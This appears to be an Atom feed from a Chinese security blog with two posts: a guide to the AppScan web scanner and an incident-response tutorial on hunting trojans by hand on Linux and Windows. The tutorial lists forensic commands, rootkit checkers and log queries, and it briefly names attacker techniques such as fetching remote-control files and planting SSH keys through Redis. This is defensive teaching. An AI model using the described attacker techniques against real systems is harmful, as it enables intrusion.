<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Secer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-23T15:18:31.684Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>shiqian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Appscan使用指北</title>
    <link href="http://yoursite.com/2018/08/23/Appscan%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/23/Appscan使用指北/</id>
    <published>2018-08-23T13:45:05.000Z</published>
    <updated>2018-08-23T15:18:31.684Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-115.png" alt="upload successful"></p><h2 id="关于Appscan"><a href="#关于Appscan" class="headerlink" title="关于Appscan"></a>关于Appscan</h2><p>Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan  source edition，到针对 Web 应用进行快速扫描的 AppScan    standard edition，以及进行安全管理和汇总整合的 AppScan     enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的AppScan，即 AppScan standard edition。其安装在Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试</p><h2 id="AppScan工作原理"><a href="#AppScan工作原理" class="headerlink" title="AppScan工作原理"></a>AppScan工作原理</h2><p><img src="\images\pasted-117.png" alt="upload successful"></p><p>1.通过搜索（爬行）发现整个 Web 应用结构</p><p>2.根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库）</p><p>3.通过对于 Respone 的分析验证是否存在安全漏洞</p><h4 id="扫描原理"><a href="#扫描原理" class="headerlink" title="扫描原理"></a>扫描原理</h4><p>扫描规则库 + 爬行 + 测试</p><p><img src="\images\pasted-116.png" alt="upload successful"></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h4 id="常规扫描"><a href="#常规扫描" class="headerlink" title="常规扫描"></a>常规扫描</h4><p>下一步——下一步。。</p><p>1.打开 AppScan.exe 选择 文件</p><p>2.选择常规扫描（扫描规则自己可以定义后面详细说明）下一步</p><p><img src="\images\pasted-119.png" alt="upload successful"></p><p>3.输入你要扫描的起始 url，然后下一步</p><h4 id="登录扫描"><a href="#登录扫描" class="headerlink" title="登录扫描"></a>登录扫描</h4><p>如果选择记录此项后,会出现一个新的浏览器，并尝试链接到指定的网站作为本扫描的起始 URL.你需要输入账号和密码登陆到应用程序.这样设置之后你可以关闭浏览器，但是不要点击注销按钮.</p><p>更改浏览器：Tools–&gt;Options –&gt;Advanced  OpenIEBrower 的值 0–Appscan浏览器,1–IE,2–Firefox,3–Chrome.<br>如果选择提示，每次注销之后,Appscan 会提示你登陆到应用程序中.如果你打算整个扫描你的系统，你可以选择这个选项</p><p><img src="\images\pasted-118.png" alt="upload successful"><br>如果遇到没有验证码的登录页面可以选择自动选择下一步</p><h4 id="测试策略"><a href="#测试策略" class="headerlink" title="测试策略"></a>测试策略</h4><p>根据你的测试策略,你需要选择最适合你需求的策略,现有的策略都是默认（缺省）的</p><p><img src="\images\pasted-120.png" alt="upload successful"><br>这是开始扫描的最后一步.IBM Rational Appscan 允许你选择你想要的扫描方式，即完成扫描,探索扫描等</p><p><img src="\images\pasted-121.png" alt="upload successful"></p><h2 id="AppScan-简单配置"><a href="#AppScan-简单配置" class="headerlink" title="AppScan-简单配置"></a>AppScan-简单配置</h2><h4 id="配置面板"><a href="#配置面板" class="headerlink" title="配置面板"></a>配置面板</h4><p>点击 appscan 的配置选项即可打开配置面板，里面的参数可以根据自己实际情况修改</p><p><img src="\images\pasted-122.png" alt="upload successful"></p><h4 id="排除文件路径"><a href="#排除文件路径" class="headerlink" title="排除文件路径"></a>排除文件路径</h4><p><img src="\images\pasted-123.png" alt="upload successful"></p><h4 id="探索选项"><a href="#探索选项" class="headerlink" title="探索选项"></a>探索选项</h4><p><img src="\images\pasted-124.png" alt="upload successful"></p><h4 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h4><p><img src="\images\pasted-125.png" alt="upload successful"></p><h4 id="扫描策略"><a href="#扫描策略" class="headerlink" title="扫描策略"></a>扫描策略</h4><p>可以根据网站条件修改 为加快网站扫描速度 可以去掉不重要的漏洞扫描</p><h4 id="配置总结"><a href="#配置总结" class="headerlink" title="配置总结"></a>配置总结</h4><p>对于大型的网站，我们可以从几个方面来优化配置：</p><p>1.选择合适的，最小化的扫描规则</p><p>2.分解扫描任务，把一个大的扫描任务分解为多个小的扫描任务</p><p>3.根据页面特点，设置可以过滤的类似页面（冗余页面）</p><h2 id="扩展工具"><a href="#扩展工具" class="headerlink" title="扩展工具"></a>扩展工具</h2><p><img src="\images\pasted-126.png" alt="upload successful"></p><p>表单破解</p><p><img src="\images\pasted-127.png" alt="upload successful"><br>链接测试</p><p><img src="\images\pasted-128.png" alt="upload successful"><br>编码转换</p><p><img src="\images\pasted-129.png" alt="upload successful"><br>正则测试、</p><p><img src="\images\pasted-130.png" alt="upload successful"><br>发包测试</p><p><img src="\images\pasted-131.png" alt="upload successful"><br>会话令牌分析</p><p><img src="\images\pasted-132.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>应急响应手工杀马</title>
    <link href="http://yoursite.com/2018/08/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%B7%A5%E6%9D%80%E9%A9%AC/"/>
    <id>http://yoursite.com/2018/08/22/应急响应手工杀马/</id>
    <published>2018-08-22T07:05:42.000Z</published>
    <updated>2018-08-22T12:25:41.450Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-113.png" alt="upload successful"></p><h1 id="一-什么是应急响应"><a href="#一-什么是应急响应" class="headerlink" title="一.什么是应急响应"></a>一.什么是应急响应</h1><p>应急响应的目的:恢复系统的CIA</p><h3 id="应急响应6个阶段："><a href="#应急响应6个阶段：" class="headerlink" title="应急响应6个阶段："></a>应急响应6个阶段：</h3><p>pdcerf</p><p>准备、检测、遏制、根除、恢复、跟踪</p><h3 id="安全事件分类："><a href="#安全事件分类：" class="headerlink" title="安全事件分类："></a>安全事件分类：</h3><p>1.Web入侵：挂马、篡改、Webshell，僵  木  蠕  等有害程序</p><p>2.网络攻击类 : DOS   DDOS  扫描</p><p>3.信息破坏类：网站内容篡改、假冒信息，脱裤、数据库登录（弱口令）</p><p>4.信息内容安全：不良言论</p><p>5.设备的软硬件故障</p><p>6.自然灾害</p><p>7.系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞</p><h3 id="事件分级（四级）"><a href="#事件分级（四级）" class="headerlink" title="事件分级（四级）:"></a>事件分级（四级）:</h3><p>原则：根据信息系统的危害程度，信息系统的重要性、以及对社会的影响等</p><p>1.特大</p><p>2.重大</p><p>3.严重</p><p>4.一般</p><h1 id="二-排查思路"><a href="#二-排查思路" class="headerlink" title="二.排查思路"></a>二.排查思路</h1><p>一个常规的入侵事件后的系统排查思路：</p><p><img src="\images\pasted-110.png" alt="upload successful"></p><h3 id="1-文件分析"><a href="#1-文件分析" class="headerlink" title="1.文件分析"></a>1.文件分析</h3><p>文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件</p><p>webshell排查分析</p><p>核心应用关联目录文件分析</p><h3 id="2-进程分析"><a href="#2-进程分析" class="headerlink" title="2.进程分析"></a>2.进程分析</h3><p>当前活动进程 &amp; 远程连接 </p><p>启动进程 &amp; 计划任务</p><p>进程工具分析:    windows：Pchunter</p><pre><code>linux:  Chkrootkit&amp;Rkhunter</code></pre><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><p>系统变量</p><p>环境变量</p><p>history</p><p>系统配置文件</p><h3 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h3><p>操作系统日志</p><p>windows事件查看器(eventvwr),  linux( /var/log)</p><p>应用日志分析: access.log     Error.log</p><h1 id="三-分析排查"><a href="#三-分析排查" class="headerlink" title="三.分析排查"></a>三.分析排查</h1><h2 id="Linux分析排查"><a href="#Linux分析排查" class="headerlink" title="Linux分析排查"></a>Linux分析排查</h2><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h5 id="敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）"><a href="#敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）" class="headerlink" title="敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）"></a>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）</h5><p> 例如: 查看tmp目录下的文件： <code>ls –alt /tmp/</code></p><p>查看开机启动项内容：<code>ls -alt /etc/init.d/</code></p><p>查看指定目录下文件时间的排序：<code>ls -alt | head -n 10</code></p><p>针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改。</p><h5 id="新增文件分析"><a href="#新增文件分析" class="headerlink" title="新增文件分析"></a>新增文件分析</h5><p>例如要查找24小时内被修改的文件：</p><p><code>find   ./  -mtime 0 -name “文件名”</code> （最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）</p><p>查找72小时内新增的文件 : <code>find / -ctime -2</code>      -ctime 内容未改变权限改变时候也可以查出</p><p>根据确定时间去反推变更的文件：  <code>ls -al /tmp | grep &quot;Feb 27&quot;</code></p><h5 id="特殊权限的文件"><a href="#特殊权限的文件" class="headerlink" title="特殊权限的文件 "></a>特殊权限的文件 </h5><p>查找777的权限的文件 <code>find  / *.jsp   -perm 4777</code></p><h5 id="隐藏的文件"><a href="#隐藏的文件" class="headerlink" title="隐藏的文件"></a>隐藏的文件</h5><p>（以 “.”开头的具有隐藏属性的文件）</p><p>在文件分析过程中，手工排查频率较高的命令是 find   grep     ls 核心目的是为了关联推理出可疑文件。</p><p>进程分析</p><h5 id="使用netstat-网络连接命令"><a href="#使用netstat-网络连接命令" class="headerlink" title="使用netstat 网络连接命令"></a>使用netstat 网络连接命令</h5><p>分析可疑端口、可疑IP、可疑PID及程序进程  <code>netstat   –antlp | more</code></p><h5 id="使用ps命令，分析进程"><a href="#使用ps命令，分析进程" class="headerlink" title="使用ps命令，分析进程"></a>使用ps命令，分析进程</h5><p><code>ps aux | grep pid | grep –v grep</code></p><h5 id="查看指定端口对应的程序"><a href="#查看指定端口对应的程序" class="headerlink" title="查看指定端口对应的程序"></a>查看指定端口对应的程序</h5><p>使用<code>lsof -i:1677</code></p><h5 id="使用ls-以及-stat-查看系统命令是否被替换"><a href="#使用ls-以及-stat-查看系统命令是否被替换" class="headerlink" title="使用ls 以及 stat 查看系统命令是否被替换"></a>使用ls 以及 stat 查看系统命令是否被替换</h5><p> 两种思路：</p><p>第一种查看命令目录最近的时间排序</p><p>第二种根据确定时间去匹配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ls -alt /usr/bin | head -10 ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</span><br></pre></td></tr></table></figure></p><h5 id="隐藏进程查看"><a href="#隐藏进程查看" class="headerlink" title="隐藏进程查看"></a>隐藏进程查看</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk &apos;&#123;print&#125;&apos; | sort -n | uniq &gt;1</span><br><span class="line">ls /proc | sort -n |uniq &gt;2</span><br><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><h5 id="查看分析任务计划"><a href="#查看分析任务计划" class="headerlink" title="查看分析任务计划"></a>查看分析任务计划</h5><p> a.通过<code>crontabl –l</code> 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；</p><p> b.查看etc目录任务计划相关文件，<code>ls /etc/cron*</code></p><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">history (cat /root/.bash_history)</span><br><span class="line">/etc/passwd</span><br><span class="line">crontab  /etc/cron*</span><br><span class="line">rc.local  /etc/init.d chkconfig</span><br><span class="line">last</span><br><span class="line">$PATH</span><br><span class="line">strings</span><br></pre></td></tr></table></figure><h5 id="查看分析history-cat-root-bash-history"><a href="#查看分析history-cat-root-bash-history" class="headerlink" title="查看分析history (cat /root/.bash_history)"></a>查看分析history (cat /root/.bash_history)</h5><p>曾经的命令操作痕迹，以便进一步排查溯源。有可能通过记录关联到如下信息：</p><p>a.wget 远程某主机（域名&amp;IP）的远控文件；</p><p> b.尝试连接内网某主机（ssh scp），便于分析攻击者意图; </p><p>c.打包某敏感数据或代码，tar zip 类命令 </p><p>d.对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</p><h5 id="查看分析用户相关分析"><a href="#查看分析用户相关分析" class="headerlink" title="查看分析用户相关分析"></a>查看分析用户相关分析</h5><p>a. <code>useradd userdel</code> 的命令时间变化（stat），以及是否包含可疑信息</p><p> b. <code>cat /etc/passwd</code> 分析可疑帐号，可登录帐号 查看UID为0的帐号：</p><pre><code> `awk  -F: &apos;{if($3==0)print $1}&apos; /etc/passwd `</code></pre><p>c. 查看能够登录的帐号：</p><pre><code>  `cat /etc/passwd | grep -E &quot;/bin/bash$&quot; `</code></pre><p>PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</p><h5 id="查看linux-开机启动程序"><a href="#查看linux-开机启动程序" class="headerlink" title="查看linux 开机启动程序"></a>查看linux 开机启动程序</h5><p>a.  <code>查看rc.local文件（/etc/init.d/rc.local /etc/rc.local）</code></p><p> b.  <code>ls –alt /etc/init.d/ c) chkconfig</code></p><h5 id="查看系统用户登录信息"><a href="#查看系统用户登录信息" class="headerlink" title="查看系统用户登录信息 "></a>查看系统用户登录信息 </h5><p>a.  使用lastlog命令，系统中所有用户最近一次登录信息。</p><p> b.  使用lastb命令，用于显示用户错误的登录列表 c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp） utmp文件中保存的是当前正在本系统中的用户的信息。 wtmp文件中保存的是登录过本系统的用户的信息。 /var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp</p><h5 id="系统路径分析"><a href="#系统路径分析" class="headerlink" title="系统路径分析"></a>系统路径分析</h5><p><code>echo $PATH</code>分析有无敏感可疑信息</p><h5 id="指定信息检索"><a href="#指定信息检索" class="headerlink" title="指定信息检索 "></a>指定信息检索 </h5><p>a.  strings命令在对象文件或二进制文件中查找可打印的字符串 </p><p>b.  分析sshd 文件，是否包括IP信息</p><h5 id="查看ssh相关目录有无可疑的公钥存在"><a href="#查看ssh相关目录有无可疑的公钥存在" class="headerlink" title="查看ssh相关目录有无可疑的公钥存在"></a>查看ssh相关目录有无可疑的公钥存在</h5><p> a.   Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。 </p><p>b.   目录： /etc/ssh ./.ssh/</p><h3 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h3><p>推荐工具：<br>chkrootkit       rkhunter（<a href="http://www.chkrootkit.org" target="_blank" rel="noopener">www.chkrootkit.org</a> rkhunter.sourceforge.net）</p><h5 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h5><p>(迭代更新了20年)主要功能：<br>1    检测是否被植入后门、木马、rootkit<br>2    检测系统命令是否正常<br>3    检测登录日志<br>4    详细参考README</p><h5 id="rkhunter："><a href="#rkhunter：" class="headerlink" title="rkhunter："></a>rkhunter：</h5><p>1    系统命令（Binary）检测，包括Md5 校验<br>2    Rootkit检测<br>3    本机敏感目录、系统配置、服务及套间异常检测<br>4    三方应用版本检测</p><h5 id="Webshell查找"><a href="#Webshell查找" class="headerlink" title="Webshell查找"></a>Webshell查找</h5><p>Github上存在各种版本的webshell查杀脚本</p><p>通过chkrootkit 、rkhunter、Webshell Check 等手段得出以下应对措施：</p><p>1.根据进程、连接等信息关联的程序，查看木马活动信息</p><p>2.假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</p><p>3.发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</p><p>4.发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/log/message       包括整体系统信息</span><br><span class="line">/var/log/auth.log        包含系统授权信息，包括用户登录和使用的权限机制等</span><br><span class="line">/var/log/userlog         记录所有等级用户信息的日志。</span><br><span class="line">/var/log/cron           记录crontab命令是否被正确的执行</span><br><span class="line">/var/log/xferlog(vsftpd.log)记录Linux FTP日志</span><br><span class="line">/var/log/lastlog         记录登录的用户，可以使用命令lastlog查看</span><br><span class="line">/var/log/secure         记录大多数应用输入的账号与密码，登录成功与否</span><br><span class="line">var/log/wtmp　　      记录登录系统成功的账户信息，等同于命令last</span><br><span class="line">var/log/faillog　　      记录登录系统不成功的账号信息，一般会被黑客删除</span><br></pre></td></tr></table></figure></p><h5 id="日志查看分析"><a href="#日志查看分析" class="headerlink" title="日志查看分析"></a>日志查看分析</h5><p>grep,sed,sort,awk</p><h5 id="基于时间的日志管理："><a href="#基于时间的日志管理：" class="headerlink" title="基于时间的日志管理："></a>基于时间的日志管理：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/wtmp /var/run/utmp /var/log/lastlog(lastlog) /var/log/btmp(lastb)</span><br></pre></td></tr></table></figure><h5 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h5><p>可以关注Accepted、Failed password 、invalid特殊关键字</p><h5 id="登录相关命令"><a href="#登录相关命令" class="headerlink" title="登录相关命令"></a>登录相关命令</h5><p> lastlog 记录最近几次成功登录的事件和最后一次不成功的登录</p><h5 id="who-命令查询utmp文件"><a href="#who-命令查询utmp文件" class="headerlink" title="who 命令查询utmp文件"></a>who 命令查询utmp文件</h5><p>Who的缺省输出包括用户名、终端类型、登录日期及远程主机</p><h5 id="w-命令查询utmp文件"><a href="#w-命令查询utmp文件" class="headerlink" title="w 命令查询utmp文件"></a>w 命令查询utmp文件</h5><p>显示当前系统中每个用户和它所运行的进程信息</p><h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p>用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数</p><h5 id="last-命令"><a href="#last-命令" class="headerlink" title="last 命令"></a>last 命令</h5><p>往回搜索wtmp来显示自从文件第一次创建以来登录过的用户</p><h5 id="finger-命令"><a href="#finger-命令" class="headerlink" title="finger 命令"></a>finger 命令</h5><p>用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。</p><h5 id="日志命令"><a href="#日志命令" class="headerlink" title="日志命令"></a>日志命令</h5><p>定位有多少IP在爆破主机的root帐号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure></p><p>登录成功的IP有哪些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  </span><br><span class="line"></span><br><span class="line">tail -400f demo.log #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">less demo.log #查看日志文件，支持上下滚屏，查找功能  </span><br><span class="line"></span><br><span class="line">uniq -c demo.log  #标记该行重复的数量，不重复值为1 </span><br><span class="line"></span><br><span class="line">grep -c &apos;ERROR&apos; demo.log   #输出文件demo.log中查找所有包行ERROR的行的数量</span><br></pre></td></tr></table></figure></p><h3 id="相关处置"><a href="#相关处置" class="headerlink" title="相关处置"></a>相关处置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kill -9</span><br><span class="line">chattr –i  加锁</span><br><span class="line">rm</span><br><span class="line">setfacl</span><br><span class="line">ssh</span><br><span class="line">chmod  000  把木马去权限</span><br></pre></td></tr></table></figure><h2 id="Windows分析排查"><a href="#Windows分析排查" class="headerlink" title="Windows分析排查"></a>Windows分析排查</h2><h4 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h4><ol><li><p>开机启动有无异常文件</p></li><li><p>各个盘下的temp(tmp)相关目录下查看有无异常文件</p></li><li><p>浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</p></li><li><p>查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</p></li><li><p>查看用户recent相关文件，通过分析最近打开分析可疑文件</p></li></ol><p> C:\Documents and Settings\Administrator\Recent</p><p> C:\Documents and Settings\Default User\Recent</p><p> 开始,运行 %UserProfile%\Recent</p><ol start="6"><li>根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件</li></ol><h4 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h4><ol><li><p><code>netstat -ano</code> 查看目前的网络连接，定位可疑的ESTABLISHED</p></li><li><p>根据netstat 定位出的pid，再通过tasklist命令进行进程定位</p></li><li>通过tasklist命令查看可疑程序</li></ol><h4 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h4><p>1.使用set命令查看变量的设置<br>2.Windows 的计划任务；<br>3.Windows 的帐号信息，如隐藏帐号等<br>4.配套的注册表信息检索查看，SAM文件以及远控软件类<br>5.查看systeminfo 信息，系统版本以及补丁信息 例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）… 若进行漏洞比对，建议使用Windows-Exploit-Suggester <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester/</a></p><h4 id="后门排查-1"><a href="#后门排查-1" class="headerlink" title="后门排查"></a>后门排查</h4><p>PC Hunter是一个Windows系统信息查看软件<br><a href="http://www.xuetr.com/" target="_blank" rel="noopener">http://www.xuetr.com/</a></p><p>功能列表如下：</p><p>1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能<br>2.内核驱动模块查看，支持内核驱动模块的内存拷贝</p><p>3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook<br>4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除<br>5.端口信息查看，目前不支持2000系统<br>6.查看消息钩子<br>7.内核模块的iat、eat、inline hook、patches检测和恢复<br>8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除<br>9.注册表编辑<br>10.进程iat、eat、inline hook、patches检测和恢复<br>11.文件系统查看，支持基本的文件操作<br>12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME<br>13.ObjectType Hook检测和恢复<br>14.DPC定时器检测和删除<br>15.MBR Rootkit检测和修复<br>16.内核对象劫持检测<br>17.WorkerThread枚举<br>18.Ndis中一些回调信息枚举<br>19.硬件调试寄存器、调试相关API检测<br>20.枚举SFilter/Fltmgr的回调</p><p>PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p>1.打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）<br>2.主要分析安全日志，可以借助自带的筛选功能</p><p>3.可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</span><br></pre></td></tr></table></figure></p><p>4.强大的日志分析工具Log Parser</p><p>#分析IIS日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</span><br></pre></td></tr></table></figure></p><p>比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675&quot;</span><br></pre></td></tr></table></figure></p><p>事件ID是很好的索引</p><p>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p><h4 id="相关处置-1"><a href="#相关处置-1" class="headerlink" title="相关处置"></a>相关处置</h4><p>1.通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)<br>2.木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除<br>3.最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p><p>### </p><h2 id="应用类"><a href="#应用类" class="headerlink" title="应用类"></a>应用类</h2><p>Apache、tomcat、Nginx、IIS<br>无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find . access_log |grep xargs ip攻击地址</span><br><span class="line">find . access_log| grep xargs 木马文件名</span><br><span class="line">页面访问排名前十的IP</span><br><span class="line">cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">页面访问排名前十的URL</span><br><span class="line">cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">查看最耗时的页面</span><br><span class="line">cat access.log | sort -k 2 -n -r | head 10</span><br></pre></td></tr></table></figure></p><p>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。</p><p>首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p><img src="\images\pasted-111.png" alt="upload successful"></p><p>一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。</p><p><img src="\images\pasted-112.png" alt="upload successful"></p><h1 id="应急总结"><a href="#应急总结" class="headerlink" title="应急总结"></a>应急总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 